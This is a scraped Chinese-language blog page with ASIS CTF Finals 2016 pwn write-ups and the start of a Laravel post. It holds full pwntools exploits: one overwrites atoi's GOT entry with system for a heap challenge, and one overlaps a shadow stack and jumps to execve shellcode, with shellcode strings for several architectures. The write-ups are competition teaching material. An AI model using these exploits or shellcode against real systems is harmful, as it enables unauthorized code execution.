<span class="number">31337</span></span><br><span class="line">ELF_PATH = <span class="string">&quot;./car_market&quot;</span></span><br><span class="line"><span class="comment">#LIBC_PATH = &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">LIBC_PATH = <span class="string">&quot;./car_libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line">libc = ELF(LIBC_PATH)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_car</span>(<span class="params">model, price</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;model\n&quot;</span>, model)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;price\n&quot;</span>, <span class="built_in">str</span>(price))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sel_car_cust</span>(<span class="params">idx, cust_zip</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (choice, data) <span class="keyword">in</span> cust_zip:</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;: \n&quot;</span>, data)</span><br><span class="line">    </span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># exit cust mode</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_heap</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># add cust</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;3&quot;</span>) <span class="comment"># add com</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;: \n&quot;</span>, <span class="string">&quot;123&quot;</span>) <span class="comment"># input com</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># exit cust</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># add cust</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># exit cust</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;1&quot;</span>) <span class="comment"># list</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;Firstname : &quot;</span>)</span><br><span class="line">    heap_base = u64(r.recvline().strip().ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>)) - <span class="number">0xb90</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> heap_base</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_got</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Firstname : &quot;</span>)</span><br><span class="line">    atoi_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    log.success(<span class="string">&quot;atoi_addr: &quot;</span>+<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">    libc.address += atoi_addr - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">17</span>):</span><br><span class="line">        model = <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>)+i)*<span class="number">4</span></span><br><span class="line">        price = <span class="number">100</span>+i</span><br><span class="line">        log.info(<span class="string">&quot;add car: &quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">15</span>: <span class="comment"># fake chunk</span></span><br><span class="line">            model = p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">            price = <span class="number">0x1111</span></span><br><span class="line">        add_car(model, price)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak heap base</span></span><br><span class="line">    log.info(<span class="string">&quot;leaking heap base...&quot;</span>)</span><br><span class="line">    heap_base = leak_heap(<span class="number">16</span>)</span><br><span class="line">    log.success(<span class="string">&quot;heap_base: &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overflow one byte of heap address</span></span><br><span class="line">    log.info(<span class="string">&quot;overflowing heap address...&quot;</span>)</span><br><span class="line">    choice = [<span class="number">3</span>, <span class="number">1</span>]</span><br><span class="line">    data   = [<span class="string">&quot;comment&quot;</span>, <span class="string">&quot;A&quot;</span>*<span class="number">33</span>]</span><br><span class="line">    sel_car_cust(<span class="number">16</span>, <span class="built_in">zip</span>(choice, data))   </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># add comment and overwrite customer pointer, change it to atoi@got.plt</span></span><br><span class="line">    log.info(<span class="string">&quot;modifying car 15 struct (for leaking got)...&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># add customer</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;3&quot;</span>) <span class="comment"># add comment</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;: \n&quot;</span>, p64(<span class="number">0x1111</span>) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># exit customer menu</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;5&quot;</span>) <span class="comment"># exit select car menu</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># leak atoi&#x27;s got</span></span><br><span class="line">    log.info(<span class="string">&quot;leaking atoi&#x27;s got &amp; libc base...&quot;</span>)</span><br><span class="line">    leak_got(<span class="number">15</span>)</span><br><span class="line">    system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;libc base: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">    log.success(<span class="string">&quot;system: &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite customer pointer to heap_base+0x10</span></span><br><span class="line">    log.info(<span class="string">&quot;modifying car 15 struct (for corrupting car array)...&quot;</span>)</span><br><span class="line">    choice = [<span class="number">3</span>]</span><br><span class="line">    data   = [p64(<span class="number">0x1111</span>) + p64(heap_base+<span class="number">0x10</span>)]</span><br><span class="line">    sel_car_cust(<span class="number">16</span>, <span class="built_in">zip</span>(choice, data))   </span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;5&quot;</span>) <span class="comment"># exit select car menu</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># free &amp; reallocate heap_base+0x10 , now we can control the car array </span></span><br><span class="line">    <span class="comment"># after we control the car array, overite car[14] and make it point to atoi&#x27;s got</span></span><br><span class="line">    log.info(<span class="string">&quot;modifying car array...&quot;</span>)</span><br><span class="line">    choice = [<span class="number">3</span>]</span><br><span class="line">    data   = [<span class="string">&quot;A&quot;</span>*<span class="number">0x20</span>+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])]</span><br><span class="line">    sel_car_cust(<span class="number">15</span>, <span class="built_in">zip</span>(choice, data))   </span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;5&quot;</span>) <span class="comment"># exit select car menu</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># overwrite atoi&#x27;s got</span></span><br><span class="line">    log.info(<span class="string">&quot;overwriting atoi&#x27;s got...&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># select car</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index\n&quot;</span>, <span class="string">&quot;14&quot;</span>) <span class="comment"># input index</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;2&quot;</span>) <span class="comment"># set model (atoi&#x27;s got)</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;model\n&quot;</span>, p64(system))</span><br><span class="line">    r.sendline(<span class="string">&quot;sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">&quot;get shell !&quot;</span>)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
<p>寫完 exploit 之後拿來跑，然後就 timeout 了… </p>
<p>傳到 trello 請 Ann Tsai 幫忙跑之後就去睡了，結果醒來時卻發現這題還沒過 @@<br>原來是 Ann Tsai 在拿到 shell 之後找不到 flag ?! </p>
<p>結果用她的機器進行測試的時候發現 flag 藏在一個頗猥瑣的位置</p>
<pre>
$ ls -la
total 40
drwxr-x--- 2 root marketpwn  4096 Sep  8 10:02 .
drwxr-xr-x 3 root root       4096 Sep  8 09:51 ..
lrwxrwxrwx 1 root marketpwn     9 Sep  8 09:59 .bash_history -> /dev/null
-rw-r--r-- 1 root marketpwn   220 Sep  8 09:51 .bash_logout
-rw-r--r-- 1 root marketpwn  3771 Sep  8 09:51 .bashrc
-rwxr-xr-x 1 root marketpwn 10504 Sep  8 09:56 car_market
-r--r----- 1 root marketpwn    39 Sep  8 09:57 ._flag
-rw-r--r-- 1 root marketpwn   655 Sep  8 09:51 .profile
-rwxr-xr-x 1 root marketpwn   104 Sep  8 09:56 wrapper.sh
</pre>

<p>看來主辦方是想惡搞我們參賽者。沒關係，cat flag 下一下結束這回合:  </p>
<pre>
$ cat ._flag
cat: ._flag: No such file or directory
</pre>

<p>(☉д⊙)………WTF ?!</p>
<p>主辦方不知道下了什麼巫術，讓我們看到了 flag 檔名卻不讓我們 cat flag 的內容。之後進行了一連串 command line 的嘗試，例如 <code>for f in .*;do cat $f;done</code>，不過還是無法讀取。最後是 ddaa 用 <code>cat .*</code> 讓 flag 噴出來的……到現在還是匪夷所思…..</p>
<p>flag: <code>ASIS&#123;a0b8813fc566836c8b5f37fe68c684c5&#125;</code></p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/14/ASIS-CTF-Finals-2016-shadow-99/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/14/ASIS-CTF-Finals-2016-shadow-99/" itemprop="url">[ASIS CTF Finals 2016] shadow 99</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-14T18:04:00+08:00">
                2016-09-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: pwn<br>Point: 99<br>Solver: bruce30262 @ BambooFox<br>感謝 Ann Tsai 提供機器並幫忙跑 exploit，以及 angelboy 對 exploit 的指點 XD</p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>32 bit ELF, 除了 stack guard 有開以外其他保護全部沒開</p>
<p>程式首先會用 <code>mmap</code> 配置一塊大小為 0x30000 的記憶體區塊，並將其當成 shadow stack 來使用，存放 return address。  </p>
<p>main function 裡面會先要我們輸入名字 (buffer 位址在 .bss 段)，之後我們可以選擇新增一個 beer，或是讀取&#x2F;編輯一個 beer description。</p>
<p>新增一個 beer 時，程式會先要求 beer description 的長度，之後會呼叫 malloc 配置一塊相對應大小的 buffer 給我們輸入 beer description 的內容。至於讀取&#x2F;編輯一個 beer description 則是會先要我們選擇要讀取&#x2F;編輯的 beer，之後會印出 beer 的 description，並詢問我們是否要編輯 beer 的 description。此時如果輸入一個 invalid 的選項 ( not y or n )，程式會直接進行遞迴呼叫，再 call 一次該 function 並做同樣的事情，直到我們輸入 y 或 n 為止。</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>這題關鍵的地方在於  </p>
<ul>
<li>我們可以控制 malloc 的長度，以及 malloc 後 buffer 的內容</li>
<li>我們可以對程式做遞迴呼叫</li>
</ul>
<p>glibc 的 malloc 在 size 很大的時候 (超過 0x20000)，會改用 mmap 來進行動態的記體配置。而 mmap 出來的 memory page，會接在上一次 mmap 出來的 memory page 的前面。因此，透過第一點，我們可以嘗試去新增一個長度很長的 beer description，這樣程式在呼叫 mmap 之後<strong>會將我們 beer description 的 buffer 接在 shadow stack 的前面。</strong>  </p>
<p>之後我們可以嘗試對程式進行多次的遞迴呼叫，讓 shadow stack 不斷的 “往上長” (意即 shadow stack 的 top 位址會不斷得往前移)。只要 shadow stack 長到某一程度，就會跟我們 beer description 的 buffer 重疊在一起。此時我們再透過編輯 beer description 的功能，就可以改到 shadow stack 上的 return address，讓程式跳到我們想要的位址。這題因為只有 stack guard 的關係，可以執行 shellcode。 我們可以透過將 shellcode 塞入 name buffer，然後將 return address 改成 name buffer 位址的方式來跳 shellcode。</p>
<figure class="highlight python"><figcaption><span>exp_shadow.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;shadow.asis-ctf.ir&quot;</span></span><br><span class="line">PORT = <span class="number">31337</span></span><br><span class="line">ELF_PATH = <span class="string">&quot;./shadow&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_recvuntil</span>(<span class="params">s, delim</span>):</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> delim <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">        c = s.recv(<span class="number">1</span>)</span><br><span class="line">        res += c</span><br><span class="line">        sys.stdout.write(c)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myexec</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sc</span>(<span class="params">arch=context.arch</span>):</span><br><span class="line">    <span class="keyword">if</span> arch == <span class="string">&quot;i386&quot;</span>:</span><br><span class="line">        <span class="comment"># shellcraft.i386.linux.sh(), null free, 22 bytes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x0e\x58\x48\x48\x48\x99\xcd\x80&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> arch == <span class="string">&quot;amd64&quot;</span>:</span><br><span class="line">        <span class="comment"># shellcraft.amd64.linux.sh(), null free, 24 bytes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> arch == <span class="string">&quot;arm&quot;</span>:</span><br><span class="line">        <span class="comment"># null free, 27 bytes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x09\x30\x49\x40\x52\x40\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> arch == <span class="string">&quot;aarch64&quot;</span>:</span><br><span class="line">        <span class="comment"># 4 null bytes, total 35 bytes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\x06\x00\x00\x14\xe0\x03\x1e\xaa\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xa8\x1b\x80\xd2\x21\x00\x00\xd4\xfb\xff\xff\x97\x2f\x62\x69\x6e\x2f\x73\x68&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_one</span>(<span class="params">size, desr</span>):</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;send desc length&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;length?\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    log.info(<span class="string">&quot;send desc&quot;</span>)</span><br><span class="line">    r.send(desr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    </span><br><span class="line">    shellcode_addr = <span class="number">0x0804a520</span></span><br><span class="line">    shellcode = sc()</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;send name (shellcode)&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;name?\n&quot;</span>, shellcode)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;it?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;add one beer&quot;</span>)</span><br><span class="line">    add_one(<span class="number">0x20000</span>, <span class="string">&quot;A&quot;</span>*(<span class="number">0x20000</span>-<span class="number">4</span>)+<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;beer uploaded to the memory!\n&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;0\n&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;add beer done&quot;</span>)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;choose desc&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>) <span class="comment"># choose desc</span></span><br><span class="line">    r.sendline(<span class="string">&quot;0&quot;</span>) <span class="comment"># input index</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;recieving BBBB&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> r.recvuntil(<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;recieving rest output&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> r.recvline()</span><br><span class="line">    log.info(<span class="string">&quot;start stacking stack&quot;</span>)</span><br><span class="line"></span><br><span class="line">    maxx = <span class="number">80000</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(maxx):</span><br><span class="line">        check = i% <span class="number">10000</span></span><br><span class="line">        <span class="keyword">if</span> check == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> i</span><br><span class="line">        r.sendline(<span class="string">&quot;z&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">    r.send(p32(shellcode_addr)*(<span class="number">0x20000</span>/<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>


<p>不過因為主辦方網路不穩的關係，我自己跑 exploit local 端是可以 work，但是 remote 端會 timeout，因此最後是將 exploit 上傳到 trello 請隊友 Ann Tsai 幫忙跑。一開始跑的時候還是會在某個地方卡住，經過安博的指點之後修了一下 exploit，最後成功拿 shell 並得到 flag。  </p>
<p>flag: <code>ASIS&#123;732f9beb138dbca4e44d5d184c3074dc&#125;</code></p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/10/2016/custom-responses-of-laravel-validations/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/10/2016/custom-responses-of-laravel-validations/" itemprop="url">自定义 Laravel Validator 所返回的响应</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-10T21:08:08+08:00">
                2016-09-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
                    <span itemprop="name">技术</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>不得不说 Laravel 的 <a target="_blank" rel="noopener" href="http://laravel-china.org/docs/5.1/validation">Validation</a> 是极好的，非常易于使用，麻麻再也不用担心我要写一大堆验证啦 ~(　^ω^)</p>
<p>但是这个 Validator 有一个神秘的地方 ( -д-)，正如官方文档所说，它会自动判断当前请求是否为 Ajax 发送的，如果是，则在验证失败的时候返回一个 <code>JsonResponse</code> 响应而不是 <code>RedirectResponse</code> 响应。</p>
<blockquote>
<p><strong>但是</strong>，这个 JSON 响应的状态码，是 422。</p>
</blockquote>
<p>WTF！坑爹呢这是！要知道 422 这个状态码是通不过 <code>jQuery.ajax.success</code> 的啊！</p>
<p><img src="https://img.prin.studio/legacy/image.php?di=WYT3"></p>
<p>在网上找了一圈，愣是没找着什么好一点的解决方法（全是叫你在 <code>$.ajax.failed</code> 里处理错误的）。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/09/10/2016/custom-responses-of-laravel-validations/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

